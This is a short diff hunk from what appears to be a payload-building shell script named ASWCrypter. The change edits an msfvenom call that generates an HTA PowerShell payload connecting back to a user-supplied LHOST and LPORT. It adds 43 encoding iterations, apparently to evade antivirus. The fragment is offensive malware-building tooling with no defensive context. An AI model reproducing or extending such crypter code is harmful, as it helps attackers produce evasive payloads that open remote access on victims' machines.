@@ -147,7 +147,7 @@ read -p "[!] Enter payload output name [example: HtaASCrypter]: " PayloadName
 
 echo "[$GREEN+$RESTORE]$YELLOW Building shellcode ...$RESTORE"
 sleep 2
-xterm -T "SHELLCODE GENERATOR(ASWCrypter)" -geometry 100x50 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f hta-psh > $getPATH/output/chars.raw"
+xterm -T "SHELLCODE GENERATOR(ASWCrypter)" -geometry 100x50 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -i 43 -f hta-psh > $getPATH/output/chars.raw"
 clear;
 echo "
 
